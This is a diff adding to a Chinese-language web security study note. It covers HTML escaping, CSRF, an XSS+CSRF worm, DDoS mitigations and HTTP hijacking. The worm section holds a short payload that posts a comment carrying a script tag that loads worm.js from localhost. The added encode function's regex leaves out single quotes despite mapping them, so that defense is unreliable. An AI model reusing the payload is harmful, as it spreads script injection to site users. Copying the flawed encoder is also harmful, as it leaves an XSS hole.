@@ -78,6 +78,20 @@
   > + 用户富文本输入：后端白名单标签过滤，使用开源库，不要用正则过滤（正则过滤不干净的，太多种情况了）
   > + 推荐使用：`https://www.npmjs.com/package/sanitize-html`
 
+  ```js
+  function encode(html) {
+    return html.replace(/[<>&"]/g, v => (
+      {
+        '<':'&lt;',
+        '>':'&gt;',
+        '&':'&amp;',
+        "'": '&#39;',
+        '"':'&quot;',
+      }[v]
+    ))
+  }
+  ```
+
 3. demo
   ```html
     no: 不要在这里直接插入不可信数据
@@ -122,6 +136,26 @@
 + 敏感操作一定要判断请求来源、在 cookie 之外的地方增加加密串，和请求一同带上，甚至发送验证码给用户
 + refer 验证（但是 refer 可以伪造，比如在 node 中请求）
 + token
+
+### xss + csrf (蠕虫)
+不断传播的 xss + csrf 攻击
+```js
+  const attack = '<script src="http://localhost:3001/worm.js"></script>'
+  $.post('/api/comments', { content: `haha, ${attack}` })
+```
+
+### DDOS 攻击
+分布式拒绝服务
++ 黑客控制大量的肉鸡向受害主机发送非正常请求，导致目标主机耗尽资源不能为合法用户提供服务
++ 验证码是我们在互联网十分常见的技术之一。不得不说验证码是能够有效地防止多次重复请求的行为
++ 限制请求频率是最常见的针对 DDOS 攻击的防御措施（比如 github 就是每个小时 5000 次）
++ 设置自己业务为分布式服务，防止单点失效
++ 使用主流云系统和 CDN（云和 CDN 其自身有 DDOS 的防范作用）
++ 优化资源的使用来提高 web server 的负载能力
++ 买高防 ip
+
+### http 劫持
++ 使用 https
 
 ## SQL 注入
 + 对查询语句中字符做正确的转译
